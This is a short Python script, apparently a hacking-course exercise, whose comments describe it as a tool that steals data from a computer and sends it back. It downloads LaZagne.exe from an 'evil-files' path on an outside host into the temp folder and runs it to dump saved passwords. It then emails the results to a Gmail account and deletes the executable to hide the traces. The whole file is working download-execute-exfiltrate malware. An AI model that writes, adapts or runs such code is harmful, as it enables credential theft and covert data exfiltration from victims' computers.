#!/usr/bin/env python

#this program is for laZagne tool which steals data from computer and sends to us.
# we will create download link for it, download to target computer, execute, get mail report and delete file from computer

import requests, subprocess, smtplib, os, tempfile


# command = "msg * You have been hacked"
# subprocess.Popen(command, shell=True)


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]        #getting last element for file name
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    print(get_response.status_code)
    print(get_response.headers.get("Content-Type"))


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()         #get temp fo;der to download our mal file to that location
os.chdir(temp_directory)
download("http://10.0.2.16/evil-files/LaZagne.exe")
try:
    result = subprocess.check_output("LaZagne.exe all", shell=True)
except subprocess.CalledProcessError as e:
    result = "Error running LaZagne: {}".format(e.output.decode('utf-8', 'ignore'))
#result = subprocess.check_output("LaZagne.exe all", shell=True)
print(result.decode())
try:
    send_mail("insertmail@gmail.com", "passcodetest", result)
    print("mail sent successfully")
except:
    print("mail not sent, maybe some error")
try:
    os.remove("LaZagne.exe")          #delete file
    print("file deleted successfully")
except:
    print("file not deleted, maybe some error")
